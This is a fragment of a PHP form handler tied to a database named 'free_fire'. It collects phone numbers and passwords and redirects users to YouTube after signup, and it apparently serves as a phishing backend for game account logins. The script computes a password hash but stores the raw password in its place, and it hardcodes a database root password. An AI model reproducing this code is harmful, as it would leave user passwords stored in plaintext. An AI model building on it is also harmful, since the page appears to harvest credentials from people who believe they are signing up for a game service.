

  <?php
    // Database connection
    $servername = "localhost";
    $username = "root"; // Your database username
    $password = "102004"; // Your database password
    $dbname = "free_fire"; // Your database name

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Check if form is submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Validate and sanitize user inputs
        $phone = trim($_POST['phone']);
        $password = trim($_POST['password']);

        // Validate phone number and password (you can add more validations)
        if (empty($phone) || empty($password)) {
            echo "<p class='error'>Phone number and password are required.</p>";
        } else {
            // Hash the password
            $hashed_password = password_hash($password, PASSWORD_DEFAULT);

            // Prepare and bind SQL statement
            $sql = "INSERT INTO users (phone, password) VALUES (?, ?)";
            $stmt = $conn->prepare($sql);
            $stmt->bind_param("ss", $phone, $password);

            // Execute the statement
            if ($stmt->execute()) {
                 // Redirect to YouTube page after successful signup
            header("Location: https://www.youtube.com");
            } else {
                echo "<p class='error'>Error: " . $stmt->error . "</p>";
            }

            // Close statement
            $stmt->close();
        }
    }

    // Close connection
    $conn->close();
    ?> 

      <script>
function togglePassword() {
    var passwordField = document.getElementById("password");
    if (passwordField.type === "password") {
        passwordField.type = "text";
    } else {
        passwordField.type = "password";
    }
}
</script>

   
</div>
</body>
</html>
